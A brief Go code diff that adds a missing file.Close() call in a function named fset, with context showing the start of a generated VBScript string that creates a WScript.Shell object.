@@ -55,6 +55,7 @@ func fset(data_path string) {
 		fmt.Println("Error writing to file:", err)
 		return
 	}
+	file.Close()
 
 	vbscriptCode := fmt.Sprintf(`
 Set objShell = CreateObject("WScript.Shell")
